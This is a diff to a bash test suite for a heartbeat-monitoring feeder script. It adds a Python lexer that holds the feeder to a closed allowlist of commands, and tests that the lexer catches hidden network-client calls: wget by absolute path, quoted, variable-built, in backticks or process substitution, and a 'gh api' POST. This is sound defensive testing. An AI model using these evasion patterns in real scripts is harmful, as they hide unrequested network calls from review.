@@ -42,10 +42,17 @@
 # static_red, wire_red, w_mut, w_block, w_sblock, sec_mut, wfm, wf_check and wf_mut_red each decide a whole family of
 # rows; one neutered to always-pass would leave the suite green at the same count. own_ctl drives each owner, in a
 # subshell, with a known survivor and a known wrong-reason input and requires exactly one failure carrying the
-# owner's own diagnostic; a failed control stops the suite with printf and exit, not through the helpers.
+# owner's own diagnostic; a failed control stops the suite with printf and exit, not through the helpers. own_ctl is
+# itself controlled (own_meta: two failures, none, and a wrong needle must stop the suite, one failure with the needle
+# must not). expect_lost / expect_gained take the verdict the mutant must still END in, so a mutant that went red some
+# other valid way cannot read as the predicted loss or gain.
 #
-# FLOORS (MIN_PASSES, MIN_BEAT_ASSERTS at the end) are EXACT: they equal the measured counts, so deleting any case
-# trips them. Adding a case means raising them to the counts the run prints.
+# NO UNLISTED COMMAND. The static pins hold the feeder to a CLOSED SET of command words (CMD_ALLOW; the lexer is
+# cmdaudit.py, written below and controlled by known-positive and known-negative snippets), not a denylist of network
+# clients: a quoted, variable-built, absolute-path or unlisted program is a violation by construction.
+#
+# FLOORS (MIN_PASSES, MIN_BEAT_ASSERTS at the end) are EXACT and compared with `!=`: they equal the measured counts,
+# so deleting a case AND adding one both trip them. Changing a case means setting them to the counts the run prints.
 #
 # Fixtures are synthesized (cq-test-fixtures-synthesized-only); the live captures contributed
 # only the one-line aggregate answer SHAPE, never a row.
@@ -76,6 +83,11 @@ fails=0
 passes=0
 cases=0
 beat_asserts=0
+# Is en_US.utf8 both installed and settable? (R10 and the non-C locale pin below need it.) A pipe into `grep -q`
+# under pipefail can report a SIGPIPE, so the listing is captured first.
+_locales="$(locale -a 2>/dev/null)"
+HAVE_UTF8_LOCALE=0
+if grep -qiE '^en_US\.utf-?8$' <<<"$_locales" && [[ "$(LC_ALL=en_US.utf8 bash -c : 2>&1)" != *"cannot change locale"* ]]; then HAVE_UTF8_LOCALE=1; fi
 pass() { printf '  PASS: %s\n' "$1"; passes=$((passes + 1)); }
 fail() { printf '  FAIL: %s\n' "$1" >&2; fails=$((fails + 1)); }
 
@@ -482,10 +494,11 @@ PYM
 #   C_BEATMODE 200|429|500|302|403body|curlfail|timeout  C_TOKEN __unset__ | value  C_UNSET a BETTERSTACK_QUERY_* to blank
 #   C_XTRACE  1 -> bash -x                           C_SRC     feeder source (default shipped)   C_EVAL evaluator file
 #   C_BEATS / C_APIS / C_Q expected beat calls, API calls, helper queries
+#   C_NOERT   1 -> the feeder is sourced by a bash that has unset EPOCHREALTIME (an older bash has none)
 reset_case() {
   C_TARGET="$T_LUKS"; C_ARGS=""; C_ROWS="/dev/null"; C_STUB="ok"; C_API=""; C_APIMODE="ok"; C_BEATMODE="200"
   C_TOKEN="$TOKEN"; C_UNSET=""; C_XTRACE=0; C_SRC="$FEEDER_SRC"; C_EVAL="$WORK/evaluator.py"
-  C_BEATS=0; C_APIS=0; C_Q=1; C_TLSENV=0; C_GHA=0; C_NAME_OVERRIDE=""; C_LCALL=""
+  C_BEATS=0; C_APIS=0; C_Q=1; C_TLSENV=0; C_GHA=0; C_NAME_OVERRIDE=""; C_LCALL=""; C_NOERT=0
 }
 reset_case
 
@@ -625,7 +638,9 @@ STUB
   [[ "$C_GHA" != 1 ]] || envv+=("GITHUB_ACTIONS=true")
   local -a sh=("$BASH_BIN")
   [[ "$C_XTRACE" == "1" ]] && sh=("$BASH_BIN" -x)
-  if [[ -n "$C_ARGS" ]]; then
+  if [[ "$C_NOERT" == 1 ]]; then
+    env -i "${envv[@]}" "$BASH_BIN" -c 'unset EPOCHREALTIME; . "$0"' "$feeder" "$C_TARGET" >"$OUT" 2>&1
+  elif [[ -n "$C_ARGS" ]]; then
     # shellcheck disable=SC2086
     env -i "${envv[@]}" "${sh[@]}" "$feeder" $C_ARGS >"$OUT" 2>&1
   else
@@ -770,6 +785,32 @@ ctl_mutant() { # <name> <old> <new> -> sets M
 ctl_drv_survivor() { reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlx1)"; C_BEATS=1; C_APIS=1; ctl "known survivor" "NEVER_PRESENT" "x" 0 beat; }
 ctl_drv_wrongreason() { reset_case; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctlx2)"; C_BEATS=1; C_APIS=1; ctl "known wrong reason" "NEEDLE_THAT_IS_NOT_PRODUCED" "x" 3 beat; }
 land_drv_absent() { land CTL-LAND 'TEXT_THAT_IS_NOT_IN_THE_FEEDER_ZZ' 'x'; }
+# own_ctl is itself a verdict owner: the condition that grades every control above and below it. Replacing that
+# condition with `if true` would turn each of them green without a failure. own_meta runs own_ctl in a SUBSHELL
+# against a driver whose behaviour is known and requires the exit status and the text own_ctl must produce: exit 1
+# with its FATAL line for two failures, for a wrong needle and for a driver that fails nothing, and a clean return
+# with its PASS line for exactly one failure carrying the needle. It reports through printf and exit.
+own_meta() { # <label> <want-rc> <want-text> <driver-fn>
+  local label="$1" want_rc="$2" want_text="$3" out rc
+  shift 3
+  out="$( ( own_ctl "META-SUBJECT" "NEEDLE_THE_DRIVER_MUST_CARRY" "$@" ) 2>&1 )"; rc=$?
+  cases=$((cases + 1))
+  if [[ "$rc" == "$want_rc" ]] && grep -qF -- "$want_text" <<<"$out"; then
+    printf '  PASS: own_ctl control: %s\n' "$label"; passes=$((passes + 1))
+  else
+    printf 'FATAL: own_ctl control FAILED: %s (exit %s, wanted %s; wanted the text: %s)\n' "$label" "$rc" "$want_rc" "$want_text" >&2
+    sed 's/^/        | /' <<<"$out" >&2
+    exit 1
+  fi
+}
+meta_drv_two() { printf '  FAIL: first NEEDLE_THE_DRIVER_MUST_CARRY\n  FAIL: second\n' >&2; }
+meta_drv_none() { printf '  PASS: nothing failed\n'; }
+meta_drv_needle() { printf '  FAIL: one failure that carries something else\n' >&2; }
+meta_drv_good() { printf '  FAIL: exactly one, NEEDLE_THE_DRIVER_MUST_CARRY\n' >&2; }
+own_meta "two failures stop the suite with the FATAL line" 1 "saw 2 failure line(s)" meta_drv_two
+own_meta "a driver that fails nothing stops the suite with the FATAL line" 1 "saw 0 failure line(s) and 1 pass line(s)" meta_drv_none
+own_meta "a wrong needle stops the suite with the FATAL line" 1 "verdict-owner control FAILED: META-SUBJECT" meta_drv_needle
+own_meta "exactly one failure carrying the needle returns cleanly with the PASS line" 0 "PASS: verdict-owner control: META-SUBJECT" meta_drv_good
 own_ctl "ctl() fails on a known survivor (the wrong expectation did not trip expect)" "expected 1 failure" ctl_drv_survivor
 own_ctl "ctl() fails on a known wrong reason (expect tripped, but not with the named diagnostic)" "expected 1 failure" ctl_drv_wrongreason
 own_ctl "land() fails when the edit does not land" "did NOT land" land_drv_absent
@@ -784,6 +825,382 @@ reset_case; C_SRC="$M"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ctl9)"
 ctl "a feeder that prints the word exit is a failure" 'contains the word "exit"' "x" 0 beat
 
 # ── static checks of the feeder source ────────────────────────────────────────────────────────
+# ── the closed command set (H1) ───────────────────────────────────────────────────────────────
+# The old `network-client-other-than-curl` pin is a DENYLIST: it misses an absolute path (/usr/bin/wget), a quoted or
+# variable-built command word ("wget", ${W}get), and every client nobody listed (gh api, dig, git ls-remote,
+# python3 -I, perl -M, node -p, aws, rsync, logger -n ...). The pin below is a CLOSED SET: cmdaudit.py lexes the
+# feeder (comments, strings, heredoc bodies and quoted arguments are not commands; every command position is: line
+# start, after ; & && || | ( { then do else elif while until ! and inside $( ), ${ :- }, "..." and [[ ]]), and a
+# command word is a violation unless it is a plain bareword in the frozen allowlist below. Indirection is banned
+# outright: a quoted word, a variable-built or substitution-built word, a backtick, a process substitution, an
+# unquoted heredoc that expands, a word with a slash. The one legal quoted command word is "$QUERY" (the Logs
+# helper), pinned to a single use and a single assignment. bash -c, sh, eval, exec, source, env, command and xargs
+# are simply not in the set. Defined function names are frozen too, so a function named like a tool cannot shadow it.
+CMD_ALLOW_EXTERNAL="curl jq grep cut tr wc mktemp rm dirname"
+CMD_ALLOW_BUILTIN="printf echo exit set unset trap export local read return cd pwd true ["
+CMD_FUNCS="beat_once build_sql cleanup_tmp count_query def_pred diag_count elapsed_ms fmarker marker on_exit resolve_heartbeat run_query run_target select_target withhold_no_row"
+CMD_ALLOW="$CMD_ALLOW_EXTERNAL $CMD_ALLOW_BUILTIN $CMD_FUNCS"
+CMD_AUDIT_PY="$WORK/cmdaudit.py"
+cat > "$CMD_AUDIT_PY" <<'PYAUD'
+import re, sys
+
+src = open(sys.argv[1], encoding="utf-8").read()
+ALLOW = set(sys.argv[2].split())
+ASSIGN = re.compile(r"[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=")
+FDPFX = re.compile(r"[0-9]+(?=[<>])")
+FUNCDEF = re.compile(r"\(\s*\)")
+REDIR = re.compile(r"<<<|<<-|<<|<&|<>|<|>>|>&|>\||>")
+PATHY = re.compile(r"[A-Za-z0-9_./+@%-]+")
+BARE = re.compile(r"[A-Za-z0-9_.:+@%-]+|\[")
+STAY = ("if", "then", "else", "elif", "while", "until", "do", "!", "{", "time")
+ENDKW = ("fi", "done", "}")
+
+
+class L:
+    def __init__(self, s):
+        self.s, self.n, self.i = s, len(s), 0
+        self.words, self.funcs, self.viol, self.hd = [], [], [], []
+
+    def v(self, cls, detail):
+        self.viol.append((cls, detail))
+
+    def eat_heredocs(self):
+        for delim, dash, quoted in self.hd:
+            body, closed = [], False
+            while self.i < self.n:
+                k = self.s.find("\n", self.i)
+                k = self.n if k == -1 else k
+                line = self.s[self.i:k]
+                self.i = min(k + 1, self.n)
+                if (line.lstrip("\t") if dash else line) == delim:
+                    closed = True
+                    break
+                body.append(line)
+            if not closed:
+                self.v("parse", "unterminated-heredoc")
+            if not quoted and any("$(" in b or "`" in b for b in body):
+                self.v("indirect", "expansion-in-unquoted-heredoc")
+        self.hd = []
+
+    def squote(self):
+        k = self.s.find("'", self.i + 1)
+        if k == -1:
+            self.v("parse", "unterminated-squote")
+            self.i = self.n
+        else:
+            self.i = k + 1
+
+    def ansic(self):  # self.s[self.i] == "'" (the quote after the dollar)
+        self.i += 1
+        while self.i < self.n:
+            c = self.s[self.i]
+            if c == "\\":
+                self.i += 2
+                continue
+            if c == "'":
+                self.i += 1
+                return
+            self.i += 1
+        self.v("parse", "unterminated-ansic")
+
+    def backtick(self):
+        self.v("indirect", "backtick-substitution")
+        k = self.i + 1
+        while k < self.n and self.s[k] != "`":
+            k += 2 if self.s[k] == "\\" else 1
+        self.i = min(k + 1, self.n)
+
+    def arith(self):  # at "$(("
+        self.i += 3
+        depth = 2
+        while self.i < self.n and depth:
+            if self.s.startswith("$(", self.i) and not self.s.startswith("$((", self.i):
+                self.cmdsub()
+                continue
+            c = self.s[self.i]
+            if c == "(":
+                depth += 1
+            elif c == ")":
+                depth -= 1
+            self.i += 1
+        if depth:
+            self.v("parse", "unterminated-arith")
+
+    def cmdsub(self):  # at "$("
+        self.i += 2
+        self.parse_list(")")
+
+    def dquote(self):
+        self.i += 1
+        while self.i < self.n:
+            c = self.s[self.i]
+            if c == "\\":
+                self.i += 2
+            elif c == '"':
+                self.i += 1
+                return
+            elif self.s.startswith("$((", self.i):
+                self.arith()
+            elif self.s.startswith("$(", self.i):
+                self.cmdsub()
+            elif self.s.startswith("${", self.i):
+                self.param(True)
+            elif c == "`":
+                self.backtick()
+            else:
+                self.i += 1
+        self.v("parse", "unterminated-dquote")
+
+    def param(self, in_dq):  # at "${"
+        self.i += 2
+        depth = 1
+        while self.i < self.n:
+            c = self.s[self.i]
+            if c == "\\":
+                self.i += 2
+            elif c == "'" and not in_dq:
+                self.squote()
+            elif c == '"':
+                self.dquote()
+            elif self.s.startswith("$'", self.i) and not in_dq:
+                self.i += 1
+                self.ansic()
+            elif self.s.startswith("$((", self.i):
+                self.arith()
+            elif self.s.startswith("$(", self.i):
+                self.cmdsub()
+            elif self.s.startswith("${", self.i):
+                depth += 1
+                self.i += 2
+            elif c == "`":
+                self.backtick()
+            elif c == "}":
+                depth -= 1
+                self.i += 1
+                if depth == 0:
+                    return
+            else:
+                self.i += 1
+        self.v("parse", "unterminated-param")
+
+    def word(self, dbr=False):
+        st = self.i
+        while self.i < self.n:
+            c = self.s[self.i]
+            if c in " \t\n":
+                break
+            if not dbr and c in ";&|()<>":
+                break
+            if c == "\\":
+                self.i += 2
+            elif c == "'":
+                self.squote()
+            elif c == '"':
+                self.dquote()
+            elif self.s.startswith("$'", self.i):
+                self.i += 1
+                self.ansic()
+            elif self.s.startswith("$((", self.i):
+                self.arith()
+            elif self.s.startswith("$(", self.i):
+                self.cmdsub()
+            elif self.s.startswith("${", self.i):
+                self.param(False)
+            elif c == "`":
+                self.backtick()
+            else:
+                self.i += 1
+        return self.s[st:self.i]
+
+    def classify(self, raw):
+        if raw == '"$QUERY"':
+            self.words.append("$QUERY")
+            return False
+        if "/" in raw and PATHY.fullmatch(raw):
+            self.words.append(raw)
+            self.v("outside", raw)
+            return False
+        if not BARE.fullmatch(raw):
+            self.v("indirect", raw[:70])
+            return False
+        self.words.append(raw)
+        if raw not in ALLOW:
+            self.v("outside", raw)
+        return True
+
+    def parse_list(self, closer):
+        s = self.s
+        cmdpos, paren, cases = True, 0, []
+        dbr, case_hdr, for_hdr, for_list = False, 0, 0, False
+        last_idx, last_end = None, 0
+        while self.i < self.n:
+            c = s[self.i]
+            if c in " \t":
+                self.i += 1
+                continue
+            if c == "\\" and s.startswith("\\\n", self.i):
+                self.i += 2
+                continue
+            if c == "\n":
+                self.i += 1
+                self.eat_heredocs()
+                if cases and cases[-1]:
+                    cmdpos = False
+                elif not dbr:
+                    cmdpos, for_list, for_hdr = True, False, 0
+                continue
+            if c == "#":
+                k = s.find("\n", self.i)
+                self.i = self.n if k == -1 else k
+                continue
+            if not dbr:
+                if s.startswith(";;", self.i):
+                    self.i += 2
+                    if cases:
+                        cases[-1] = True
+                    cmdpos = False
+                    continue
+                if c == ";":
+                    self.i += 1
+                    cmdpos, for_list, for_hdr = not (cases and cases[-1]), False, 0
+                    continue
+                if s.startswith("&&", self.i) or s.startswith("||", self.i):
+                    self.i += 2
+                    cmdpos = True
+                    continue
+                if c == "|":
+                    self.i += 2 if s.startswith("|&", self.i) else 1
+                    if not (cases and cases[-1]):
+                        cmdpos = True
+                    continue
+                if c == "&" and not s.startswith("&>", self.i):
+                    self.i += 1
+                    cmdpos = True
+                    continue
+                if c == "(":
+                    m = FUNCDEF.match(s, self.i)
+                    if m and last_idx is not None and not s[last_end:self.i].strip():
+                        self.funcs.append(self.words.pop(last_idx))
+                        self.i = m.end()
+                        cmdpos, last_idx = True, None
+                        continue
+                    self.i += 1
+                    paren += 1
+                    cmdpos = True
+                    continue
+                if c == ")":
+                    self.i += 1
+                    if cases and cases[-1]:
+                        cases[-1], cmdpos = False, True
+                    elif paren > 0:
+                        paren, cmdpos = paren - 1, False
+                    elif closer == ")":
+                        return
+                    else:
+                        self.v("parse", "unbalanced-paren")
+                    continue
+                if c in "<>" or s.startswith("&>", self.i):
+                    if s.startswith("<(", self.i) or s.startswith(">(", self.i):
+                        self.v("indirect", "process-substitution")
+                        self.i += 1
+                        continue
+                    if c == "&":
+                        self.i += 3 if s.startswith("&>>", self.i) else 2
+                        op = "&>"
+                    else:
+                        op = REDIR.match(s, self.i).group(0)
+                        self.i += len(op)
+                    while self.i < self.n and s[self.i] in " \t":
+                        self.i += 1
+                    if op in ("<<", "<<-"):
+                        raw = self.word()
+                        quoted = any(q in raw for q in "'\"\\")
+                        self.hd.append((re.sub(r"['\"\\]", "", raw), op == "<<-", quoted))
+                    else:
+                        self.word()
+                    continue
+                m = FDPFX.match(s, self.i)
+                if m:
+                    self.i = m.end()
+                    continue
+            if dbr and s.startswith("]]", self.i) and (self.i + 2 >= self.n or s[self.i + 2] in " \t\n;&|()<>"):
+                self.i += 2
+                dbr, cmdpos = False, False
+                continue
+            raw = self.word(dbr)
+            if raw == "":
+                self.i += 1
+                continue
+            if dbr:
+                if raw == "]]":
+                    dbr, cmdpos = False, False
+                continue
+            if cases and cases[-1]:
+                if raw == "esac":
+                    cases.pop()
+                    cmdpos = False
+                continue
+            if case_hdr == 1:
+                case_hdr = 2
+                continue
+            if case_hdr == 2:
+                if raw == "in":
+                    case_hdr = 0
+                    cases.append(True)
+                continue
+            if for_hdr == 1:
+                for_hdr = 2
+                continue
+            if for_hdr == 2:
+                if raw == "in":
+                    for_list = True
+                for_hdr = 0
+                continue
+            if for_list or not cmdpos:
+                continue
+            if ASSIGN.match(raw) or raw in STAY:
+                continue
+            if raw in ENDKW:
+                cmdpos = False
+                continue
+            if raw == "esac":
+                if cases:
+                    cases.pop()
+                cmdpos = False
+                continue
+            if raw == "for":
+                for_hdr, cmdpos = 1, False
+                continue
+            if raw == "case":
+                case_hdr, cmdpos = 1, False
+                continue
+            if raw == "[[":
+                dbr, cmdpos = True, False
+                continue
+            self.classify(raw)
+            last_idx, last_end = len(self.words) - 1, self.i
+            cmdpos = False
+        if closer == ")":
+            self.v("parse", "unterminated-command-substitution")
+        if dbr:
+            self.v("parse", "unterminated-[[")
+        if self.hd:
+            self.v("parse", "unterminated-heredoc")
+
+
+lx = L(src)
+lx.parse_list(None)
+for w in lx.words:
+    print("W", w)
+for f in lx.funcs:
+    print("F", f)
+for cls, d in lx.viol:
+    print("V", cls, d)
+PYAUD
+command_audit() { # <file> -> W/F/V lines (command words, defined functions, violations)
+  "$PY" -I "$CMD_AUDIT_PY" "$1" "$CMD_ALLOW" 2>/dev/null
+}
+
 # static_violations <file>: one line per violated pin (empty = the file satisfies every static pin). The same
 # function grades the shipped feeder and the mutants, so a mutant that breaks a pin is judged by the pin itself.
 strip_comments() { sed -E 's/^[[:space:]]*#.*$//' "$1"; }
@@ -853,6 +1270,17 @@ static_violations() {
     skip { if ($0 == "}") skip = 0; next }
     /\$1|\$\{1|\$\{#1/ { print }' <<<"$S" | sed -E 's/^[[:space:]]+//')"
   [[ "$(printf '%s\n' "$top" | LC_ALL=C sort | paste -sd'|' -)" == 'if ! select_target "$1"; then|if [[ "$1" == "--selftest" ]]; then|marker "usage" "target_len=${#1}"' ]] || echo "positional-arg-interpolated"
+  # The closed command set (see command_audit). A crashed audit prints nothing, which the curl-count pin turns into a
+  # violation, so a vacuous audit cannot pass.
+  local aud
+  aud="$(command_audit "$f")" || echo "command-audit-crashed"
+  ! grep -q '^V parse ' <<<"$aud" || echo "command-audit-unparsed"
+  ! grep -q '^V outside ' <<<"$aud" || echo "command-word-outside-closed-set"
+  ! grep -q '^V indirect ' <<<"$aud" || echo "command-word-indirect"
+  [[ "$(grep '^F ' <<<"$aud" | cut -c3- | LC_ALL=C sort | paste -sd' ' -)" == "$CMD_FUNCS" ]] || echo "function-set-changed"
+  [[ "$(grep -cx 'W curl' <<<"$aud" || true)" == 2 ]] || echo "curl-command-word-count"
+  if ! { [[ "$(grep -cx 'W \$QUERY' <<<"$aud" || true)" == 1 ]] && [[ "$(grep -c '^QUERY=' "$f" || true)" == 1 ]] \
+         && grep -qxF 'QUERY="$REPO_ROOT/scripts/betterstack-query.sh"' "$f"; }; then echo "query-command-word-unpinned"; fi
 }
 echo "== static: shipped feeder =="
 printf '#!/usr/bin/env bash\nexit 0\nfoo; exit 1\nexit "$rc"\n' > "$WORK/scan-positive.sh"
@@ -873,6 +1301,55 @@ else fail "main flow order is [$_order]"; fi
 cases=$((cases + 1))
 if ! grep -qE 'FEEDER_NOW|_NOW\b|date -u' <<<"$(strip_comments "$FEEDER_SRC")"; then pass "feeder has no clock and no test seam (the SQL window is the only place time lives)"
 else fail "feeder reads a clock or declares a test seam"; fi
+
+echo "== the closed command set: the lexer itself is controlled =="
+# audit_classes <snippet-text> -> the sorted violation classes the audit reports for a one-snippet script.
+audit_classes() {
+  printf '%s\n' "$1" > "$WORK/audit-snippet.sh"
+  command_audit "$WORK/audit-snippet.sh" | sed -n 's/^V \([a-z]*\) .*/\1/p' | LC_ALL=C sort -u | paste -sd, -
+}
+# Known positives: every shape in which a command can hide must be reported, in the class the pin names.
+audit_pos() { # <label> <class> <snippet>
+  cases=$((cases + 1))
+  local got; got="$(audit_classes "$3")"
+  if grep -qwF -- "$2" <<<"${got//,/ }"; then pass "audit known-positive ($1): reported as $2"
+  else fail "audit known-positive ($1): wanted a $2 violation, got [${got:-none}]"; fi
+}
+audit_neg() { # <label> <snippet>
+  cases=$((cases + 1))
+  local got; got="$(audit_classes "$2")"
+  if [[ -z "$got" ]]; then pass "audit known-negative ($1): no violation"
+  else fail "audit known-negative ($1): got [$got]"; fi
+}
+audit_pos "absolute path" outside '/usr/bin/wget -q example.invalid'
+audit_pos "quoted command word" indirect '"wget" -q example.invalid'
+audit_pos "single-quoted command word" indirect "'wget' -q example.invalid"
+audit_pos "variable-built command word" indirect 'W=wg; ${W}get -q example.invalid'
+audit_pos "substitution-built command word" indirect '$(echo wget) -q example.invalid'
+audit_pos "after a pipe" outside 'echo a | wget -q'
+audit_pos "after &&" outside 'true && wget -q example.invalid'
+audit_pos "after then" outside 'if true; then wget -q example.invalid; fi'
+audit_pos "in a case arm" outside 'case x in x) wget -q example.invalid ;; esac'
+audit_pos "inside a double-quoted substitution" outside 'echo "$(wget -q example.invalid)"'
+audit_pos "inside an assignment substitution" outside 'zz=$(wget -q example.invalid)'
+audit_pos "inside a parameter default" outside 'x=${y:-$(wget -q example.invalid)}'
+audit_pos "inside [[ ]]" outside '[[ -n "$(wget -q example.invalid)" ]]'
+audit_pos "after an assignment prefix" outside 'FOO=1 wget -q example.invalid'
+audit_pos "in a brace group" outside '{ wget -q example.invalid; }'
+audit_pos "in a subshell" outside '( wget -q example.invalid )'
+audit_pos "backtick substitution" indirect 'echo `wget -q example.invalid`'
+audit_pos "unquoted heredoc that expands" indirect "$(printf 'cat <<EOF\n$(wget x)\nEOF')"
+audit_pos "process substitution" indirect 'echo >(wget -q example.invalid)'
+audit_pos "an unterminated substitution fails closed" parse 'echo $(wget -q example.invalid'
+audit_pos "a tool no allowlist names (gh)" outside 'gh api -X POST repos/x/y/dispatches'
+audit_neg "a comment" 'echo ok # wget -q example.invalid'
+audit_neg "a quoted argument" 'echo "wget -q example.invalid" '"'wget'"
+audit_neg "a single-quoted heredoc body" "$(printf "cat <<'EOF'\nwget -q example.invalid\nEOF" | sed 's/^cat/echo/')"
+audit_neg "a case pattern and a for list" 'for a in wget nc; do echo "$a"; done; case "$1" in wget) echo x ;; esac'
+audit_neg "a regex operand of [[ =~ ]]" '[[ "$x" =~ ^wget$ ]] && echo y'
+audit_neg "a parameter pattern" 'echo "${v//wget/}"'
+audit_neg "a redirection target" 'echo x >/dev/null 2>&1'
+audit_neg "the one legal quoted command word" 'QUERY="$REPO_ROOT/x"; raw="$("$QUERY" "$SQL" 2>/dev/null)"'
 
 echo "== target table: derived from the script, compared with the frozen expected set =="
 discover_targets() { sed -n 's/^TARGETS="\(.*\)"$/\1/p' "$1" | head -1; }
@@ -1029,6 +1506,8 @@ LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx elb)"; C_BEATS=1; C_APIS=1
 expect "the beat marker carries elapsed_ms" 0 beat "elapsed_ms="
 cases=$((cases + 1))
 if grep -qE ' elapsed_ms=[0-9]+( |$)' "$OUT"; then pass "elapsed_ms is a number on the beat marker"; else fail "elapsed_ms is not numeric on the beat marker"; fi
+LP; C_NOERT=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx elna)"; C_BEATS=1; C_APIS=1
+expect "a bash without EPOCHREALTIME: elapsed_ms is na and the run still decides (no unbound-variable death under set -u)" 0 beat "elapsed_ms=na"
 LP; C_ROWS="$(printf '' | fx elw)"; C_Q=3
 expect "the withhold marker carries elapsed_ms" 3 no_qualifying_row "elapsed_ms="
 cases=$((cases + 1))
@@ -1262,6 +1741,9 @@ wf_run() { # <stub body> [VAR=val ...] -> WF_RC; $d/out.txt and $d/log.txt hold 
   WF_RC=0
   ( cd "$d" && env -i PATH="$PATH" HOME="$HOME" GITHUB_OUTPUT="$d/out.txt" "$@" "$BASH_BIN" --noprofile --norc -eo pipefail "${WF_RUN_OVERRIDE:-$WF_RUN}" > "$d/log.txt" 2>&1 ) || WF_RC=$?
 }
+# A negative-only check ("this text is NOT in the log") also passes when the run block never ran at all. Its
+# positive companion: the block completed (rc 0), wrote its all_decided line, and decided nothing (false).
+p_ran_undecided() { [[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt"; }
 wf_check() { # <name> <cond-description> <exit-status-of-condition>
   cases=$((cases + 1))
   if [[ "$3" == 0 ]]; then pass "$1: $2"; else fail "$1: $2"; sed 's/^/        | /' "$WORK/wf/log.txt" >&2; fi
@@ -1325,12 +1807,19 @@ wf_run 'exit 3'
 wf_check "workflow step, a silent exit 3" "no marker at all is a FEEDER FAULT (no_marker), never DARK" "$(grep -q '^::error::deadman luks-monitor-host-timer: FEEDER FAULT (no_marker); says nothing about the host$' "$WORK/wf/log.txt" && ! grep -q 'DARK' "$WORK/wf/log.txt"; echo $?)"
 wf_run 'case "$1" in claude-cost-capture) printf "deadman-feeder: target=claude-cost-capture verdict=beat_failed reason=http_status\n"; exit 4 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=2\n"; exit 0 ;; esac'
 wf_check "workflow step, second target beat_failed" "all_decided=false and a FEEDER FAULT that carries the reason and keeps the qualifying-row fact" "$([[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt" && grep -q '^::error::deadman claude-cost-capture: FEEDER FAULT (beat_failed reason=http_status); says nothing about the host: a qualifying row existed' "$WORK/wf/log.txt"; echo $?)"
+STUB_STALE='printf "deadman-feeder: target=$1 verdict=query_failed reason=helper_status\ndeadman-feeder: target=$1 verdict=trap_remapped rc=5\n"; exit 3'
+# A reason belongs to ONE marker: a later verdict-bearing marker without its own reason must not inherit it.
+p_stale() { [[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt" \
+  && [[ "$(grep -cE '^::error::deadman (luks-monitor-host-timer|claude-cost-capture): FEEDER FAULT \(trap_remapped\); says nothing about the host$' "$WORK/wf/log.txt")" == 2 ]] \
+  && ! grep -q 'trap_remapped reason' "$WORK/wf/log.txt"; }
+wf_run "$STUB_STALE"
+wf_check "workflow step, two markers" "a reason from an earlier marker does not ride onto the later trap_remapped verdict (both targets)" "$(p_stale; echo $?)"
 wf_run 'printf "::set-output name=x::y\n"; printf "deadman-feeder: target=$1 verdict=no_qualifying_row n=0\n"; exit 3'
-wf_check "workflow step, command injection" "a feeder line that starts with :: never reaches the log as a command" "$(! grep -q '^::set-output' "$WORK/wf/log.txt"; echo $?)"
+wf_check "workflow step, command injection" "a feeder line that starts with :: never reaches the log as a command" "$(! grep -q '^::set-output' "$WORK/wf/log.txt" && p_ran_undecided && grep -qx 'deadman-feeder: target=luks-monitor-host-timer verdict=no_qualifying_row n=0' "$WORK/wf/log.txt"; echo $?)"
 wf_run 'printf "deadman-feeder: target=$1 verdict=beat \033[31mred\033[0m\n"; exit 0'
-wf_check "workflow step, control characters" "an escape sequence is stripped; a line that then fails the marker shape is counted, not printed" "$(! LC_ALL=C grep -q $'\033' "$WORK/wf/log.txt"; echo $?)"
+wf_check "workflow step, control characters" "an escape sequence is stripped; a line that then fails the marker shape is counted, not printed" "$(! LC_ALL=C grep -q $'\033' "$WORK/wf/log.txt" && p_ran_undecided && grep -q 'dropped_lines=1' "$WORK/wf/log.txt"; echo $?)"
 wf_run 'printf "deadman-feeder: target=$1 verdict=beat url=https://uptime.betterstack.com/api/v1/heartbeat/SYNTHsecret\n"; exit 0'
-wf_check "workflow step, shape discipline" "a marker carrying a URL-shaped value fails the shape and is NOT printed" "$(! grep -q 'SYNTHsecret' "$WORK/wf/log.txt"; echo $?)"
+wf_check "workflow step, shape discipline" "a marker carrying a URL-shaped value fails the shape and is NOT printed" "$(! grep -q 'SYNTHsecret' "$WORK/wf/log.txt" && p_ran_undecided && grep -q 'dropped_lines=1' "$WORK/wf/log.txt"; echo $?)"
 wf_run 'printf "deadman-feeder: target=$1 verdict=weird\n"; exit 0'
 wf_check "workflow step, exit 0 without a deciding verdict" "all_decided=false (Sentry error), never ok" "$(grep -qx 'all_decided=false' "$WORK/wf/out.txt"; echo $?)"
 wf_run 'case "$1" in luks-monitor-host-timer) exit 0 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=1\n"; exit 0 ;; esac'
@@ -1544,21 +2033,23 @@ static_red() { # <row> <mutant> <violation-name>
   if grep -qxF "$3" <<<"$v"; then pass "mutation row $1 is RED in the static pins: $3"
   else fail "mutation row $1: expected static violation '$3', got [$(paste -sd, - <<<"$v")]"; fi
 }
-expect_lost() { # <row> <desc> <ERE>: the MUTANT's run must no longer carry a token the shipped feeder emits
+# The expected verdict is an ARGUMENT: a mutant that went red some OTHER valid way (query_failed, beat_failed) also
+# lacks the token, and without this check that reads as the predicted loss.
+expect_lost() { # <row> <desc> <ERE> <status> <verdict>: the MUTANT's run, still ending as <status>+<verdict>, must no longer carry a token the shipped feeder emits
   cases=$((cases + 1))
   run_case
   local seen; seen="$(markers_of)"
   printf '%s\t%s\t%s\t%s\n' "$1" "$2" "${seen:-none}" "$LAST_RC" >> "$MUT_TABLE"
-  if [[ -z "$seen" ]]; then fail "mutation row $1 ($2) went red for another reason: no verdict line at all (status $LAST_RC)"
+  if ! verdict_holds "$4" "$5"; then fail "mutation row $1 ($2) went red for another reason: status $LAST_RC verdicts [${seen:-none}], expected $4 + verdict=$5"
   elif grep -qE -- "$3" "$OUT"; then fail "mutation row $1 ($2) SURVIVED: the marker still carries /$3/"
